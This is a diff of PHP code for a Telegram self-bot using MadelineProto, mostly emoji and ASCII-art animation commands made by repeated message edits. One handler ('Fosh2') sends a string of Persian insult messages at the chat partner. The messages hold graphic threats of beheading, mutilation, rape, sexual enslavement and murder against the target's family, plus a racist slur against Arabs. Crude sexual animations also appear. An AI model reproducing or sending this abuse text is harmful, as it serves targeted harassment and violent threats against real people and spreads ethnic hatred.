-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌔---__🎆___---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌓---_🏙__---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌘---🎆_---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌕-🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => 'Gm🌝✨']);
-}
-if($text=='ارسال سوپر' or $text=='Send porn' or $text=='send porn'){
-
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '💻📂📂📂📂📂📂📂📂📂📁💻']);
-
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📂📂📂📂📂📂📂📂📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📂📂📂📂📂📂📂📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📂📂📂📂📂📂📂💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📂📂📂📂📂📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📂📂📂📂📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📂📂📂📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📁📂📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📁📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '💻📁💻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => 'Error❕ please try again']);
+  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🎊']);
 }
 if($text=='فش2' or $text=='Fosh2'){
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' دوباره ک چصشاخی کردی بچه صال یتیم پرورشگاهی  ']);
 
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' دوباره ک چصشاخی کردی بچه صال یتیم پرورشگاهی  ']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' ایندفه دیگه مادرتو عین گوصفند سر میبرم ک دیگه چصشاخی نکنی ']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ننتو کباب میکنم میندازم جلو صگام ']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' میرم صراغ خاله هات ممه های تک تکشونو با چاقو میوه خوری میبرم میپزم میدم صگام بخورن حال کنن']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ابجیاتو ورمیدارم رو صورتشون میشاشم تمیزشون میکنم میفروشمشون ب عربا ک ب عنوان برده هرشب  کیون بدن و از کوچیک بودن کیر عرب های جاهل و  سوسمار خور رنج بکشن و بطور عجیبی خمار کیر گنده بشن']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'برادرا کیونیتم میندازم جلو صگام ک هر ده دیقه یبار کیونشون مورد گایش شدید صگها قرار بگیره و بعد چنوخت از شدت درد بمیرن']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'کل نوامیص خاندانتو ب بردگی میگیرم و بشون دستور میدم ک هرشب بمدت یک صاعت برا صگام صاک بزنن']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' کل کصایی ک تو خاندانت ادعای مرد بودن میکنن رو از خایه های عدسیشون با نخ خیاطی اویزون میکنم']);
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' دیگه چیزی نموند برات بیهمچیز کل خاندانتو ب روش های مختلف و متنوع مورد تجاوز جنسی قرار دادم و ب قتل رسوندمشون']);
 
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' ایندفه دیگه مادرتو عین گوصفند سر میبرم ک دیگه چصشاخی نکنی ']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ننتو کباب میکنم میندازم جلو صگام ']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' میرم صراغ خاله هات ممه های تک تکشونو با چاقو میوه خوری میبرم میپزم میدم صگام بخورن حال کنن']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ابجیاتو ورمیدارم رو صورتشون میشاشم تمیزشون میکنم میفروشمشون ب عربا ک ب عنوان برده هرشب  کیون بدن و از کوچیک بودن کیر عرب های جاهل و  سوسمار خور رنج بکشن و بطور عجیبی خمار کیر گنده بشن']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'برادرا کیونیتم میندازم جلو صگام ک هر ده دیقه یبار کیونشون مورد گایش شدید صگها قرار بگیره و بعد چنوخت از شدت درد بمیرن']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'کل نوامیص خاندانتو ب بردگی میگیرم و بشون دستور میدم ک هرشب بمدت یک صاعت برا صگام صاک بزنن']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' کل کصایی ک تو خاندانت ادعای مرد بودن میکنن رو از خایه های عدسیشون با نخ خیاطی اویزون میکنم']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' دیگه چیزی نموند برات بیهمچیز کل خاندانتو ب روش های مختلف و متنوع مورد تجاوز جنسی قرار دادم و ب قتل رسوندمشون']);
-
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'دیگه نبینم چص شاخی کنیا ایندفه خودتو بطور فیجیعی از کیون ب قتل میرسونمت بای 😂']);
-
+  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'دیگه نبینم چص شاخی کنیا ایندفه خودتو بطور فیجیعی از کیون ب قتل میرسونمت بای 😂']);
 }
-if($text=='رقص مربع' or $text=='mokab'){
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-◽️◽️▫️▫️▫️▫️
-◽️◽️▫️▫️▫️▫️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-◽️◽️◽️▫️▫️▫️
-◽️◽️◽️▫️▫️▫️
-◽️◽️◽️▫️▫️▫️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-▫️▫️▫️▫️▫️▫️
-▫️▫️▫️▫️▫️▫️
-◽️◽️◽️◽️▫️▫️
-◽️◽️◽️◽️▫️▫️
-◽️◽️◽️◽️▫️▫️
-◽️◽️◽️◽️▫️▫️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-▫️▫️▫️▫️▫️▫️
-◽️◽️◽️◽️◽️▫️
-◽️◽️◽️◽️◽️▫️
-◽️◽️◽️◽️◽️▫️
-◽️◽️◽️◽️◽️▫️
-◽️◽️◽️◽️◽️▫️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◻️◻️◽️◽️◽️◽️
-◻️◻️◽️◽️◽️◽️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◻️◻️◻️◽️◽️◽️
-◻️◻️◻️◽️◽️◽️
-◻️◻️◻️◽️◽️◽️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◽️◽️◽️◽️◽️◽️
-◽️◽️◽️◽️◽️◽️
-◻️◻️◻️◻️◽️◽️
-◻️◻️◻️◻️◽️◽️
-◻️◻️◻️◻️◽️◽️
-◻️◻️◻️◻️◽️◽️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◽️◽️◽️◽️◽️◽️
-◻️◻️◻️◻️◻️◽️
-◻️◻️◻️◻️◻️◽️
-◻️◻️◻️◻️◻️◽️
-◻️◻️◻️◻️◻️◽️
-◻️◻️◻️◻️◻️◽️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-⬜️⬜️◻️◻️◻️◻️
-⬜️⬜️◻️◻️◻️◻️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-⬜️⬜️⬜️◻️◻️◻️
-⬜️⬜️⬜️◻️◻️◻️
-⬜️⬜️⬜️◻️◻️◻️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◻️◻️◻️◻️◻️◻️
-◻️◻️◻️◻️◻️◻️
-⬜️⬜️⬜️⬜️◻️◻️
-⬜️⬜️⬜️⬜️◻️◻️
-⬜️⬜️⬜️⬜️◻️◻️
-⬜️⬜️⬜️⬜️◻️◻️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-◻️◻️◻️◻️◻️◻️
-⬜️⬜️⬜️⬜️⬜️◻️
-⬜️⬜️⬜️⬜️⬜️◻️
-⬜️⬜️⬜️⬜️⬜️◻️
-⬜️⬜️⬜️⬜️⬜️◻️
-⬜️⬜️⬜️⬜️⬜️◻️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️🟥🟥⬜️⬜️
-⬜️⬜️🟥🟥⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️🟥🟥🟥🟥⬜️
-⬜️🟥🟥🟥🟥⬜️
-⬜️🟥🟥🟥🟥⬜️
-⬜️🟥🟥🟥🟥⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️🟥🟥🟥🟥⬜️
-⬜️🟥🟦🟦🟥⬜️
-⬜️🟥🟦🟦🟥⬜️
-⬜️🟥🟥🟥🟥⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟦🟦🟥🟥
-🟥🟥🟦🟦🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟥🟥🟥🟥🟥🟥
-🟥🟦🟦🟦🟦🟥
-🟥🟦🟦🟦🟦🟥
-🟥🟦🟦🟦🟦🟥
-🟥🟦🟦🟦🟦🟥
-🟥🟥🟥🟥🟥🟥
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟥🟥🟥🟥🟥🟥
-🟥🟦🟦🟦🟦🟥
-🟥🟦🟪🟪🟦🟥
-🟥🟦🟪🟪🟦🟥
-🟥🟦🟦🟦🟦🟥
-🟥🟥🟥🟥🟥🟥
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟦🟦🟦🟦🟦
-🟦🟦🟦🟦🟦🟦
-🟦🟦🟪🟪🟦🟦
-🟦🟦🟪🟪🟦🟦
-🟦🟦🟦🟦🟦🟦
-🟦🟦🟦🟦🟦🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟦🟦🟦🟦🟦
-🟦🟪🟪🟪🟪🟦
-🟦🟪🟪🟪🟪🟦
-🟦🟪🟪🟪🟪🟦
-🟦🟪🟪🟪🟪🟦
-🟦🟦🟦🟦🟦🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟦🟦🟦🟦🟦
-🟦🟪🟪🟪🟪🟦
-🟦🟪🟧🟧🟪🟦
-🟦🟪🟧🟧🟪🟦
-🟦🟪🟪🟪🟪🟦
-🟦🟦🟦🟦🟦🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟪🟪🟪🟪🟪🟪
-🟪🟪🟪🟪🟪🟪
-🟪🟪🟧🟧🟪🟪
-🟪🟪🟧🟧🟪🟪
-🟪🟪🟪🟪🟪🟪
-🟪🟪🟪🟪🟪🟪
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟪🟪🟪🟪🟪🟪
-🟪🟧🟧🟧🟧🟪
-🟪🟧🟧🟧🟧🟪
-🟪🟧🟧🟧🟧🟪
-🟪🟧🟧🟧🟧🟪
-🟪🟪🟪🟪🟪🟪
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟪🟪🟪🟪🟪🟪
-🟪🟧🟧🟧🟧🟪
-🟪🟧⬜️⬜️🟧🟪
-🟪🟧⬜️⬜️🟧🟪
-🟪🟧🟧🟧🟧🟪
-🟪🟪🟪🟪🟪🟪
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟧🟧🟧🟧🟧🟧
-🟧🟧🟧🟧🟧🟧
-🟧🟧⬜️⬜️🟧🟧
-🟧🟧⬜️⬜️🟧🟧
-🟧🟧🟧🟧🟧🟧
-🟧🟧🟧🟧🟧🟧
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟧🟧🟧🟧🟧🟧
-🟧⬜️⬜️⬜️⬜️🟧
-🟧⬜️⬜️⬜️⬜️🟧
-🟧⬜️⬜️⬜️⬜️🟧
-🟧⬜️⬜️⬜️⬜️🟧
-🟧🟧🟧🟧🟧🟧
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-⬜️⬜️⬜️⬜️⬜️⬜️
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟪🟫🟥🟧🟨
-🟨🟧🟥🟫🟪🟦
-🟦🟪🟫🟥🟧🟨
-🟨🟧🟥🟫🟪🟦
-🟦🟪🟫🟥🟧🟨
-🟨🟧🟥🟫🟪🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟫🟪🟫🟥🟧🟥
-🟨🟫🟥🟫🟥🟦
-🟫🟪🟫🟥🟧🟥
-🟨🟫🟥🟫🟥🟦
-🟫🟪🟫🟥🟧🟥
-🟨🟫🟥🟫🟥🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟥🟥🟥🟥🟦
-🟥🟦🟥🟥🟦🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟥🟥🟥🟥🟥
-🟥🟦🟥🟥🟦🟥
-🟦🟥🟥🟥🟥🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟥🟥🟥🟥🟦
-🟥🟦🟥🟥🟦🟥
-🟥🟥🟦🟦🟥🟥
-🟥🟥🟦🟦🟥🟥
-🟥🟦🟥🟥🟦🟥
-🟦🟥🟥🟥🟥🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟪🟥🟥🟪🟦
-🟪🟦🟥🟥🟦🟪
-🟥🟥🟦🟦🟥🟥
-🟥🟥🟦🟦🟥🟥
-🟪🟦🟥🟥🟦🟪
-🟦🟪🟥🟥🟪🟦
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-
-🟦🟪🟥🟧🟪🟦
-🟪🟦🟧🟥🟦🟪
-🟥🟧🟦🟦🟥🟧
-🟧🟥🟦🟦🟧🟥
-🟪🟦🟥🟧🟦🟪
-🟦🟪🟧🟥🟪🟦
-"]);
-
-}
-//----------------------------------------------
-if($text=='رقص' or $text=='raqs'){
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~( ._.)--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---(._. )~-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~( ._.)--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---(._. )~-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "--( ._.)-~
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~( ._.)--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---(._. )~-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
--~(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-~-(._. )--
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)~-
-
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
---( ._.)-~
-تامام
-"]);
-}
-//----------------------------------------------
-if($text=='جق' or $text=='jaq'){
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "درحال جق...."]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "👌🏻<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<👌🏻====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<=👌🏻===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<==👌🏻==="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<===👌🏻=="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<==👌🏻==="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<=👌🏻===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<👌🏻====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "👌🏻<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<=👌🏻===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<===👌🏻=="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<=👌🏻===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "👌🏻<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<=👌🏻===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<==👌🏻==="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<=👌🏻===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "👌🏻<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "💦💦<====="]);
-
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'پایان جق']);
-}
-//----------------------------------------------
-if($text=='قلب' or $text=='ghalb'){
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-💙🧡💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍💙💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💙
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      💙
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💜💙
-"]);
-
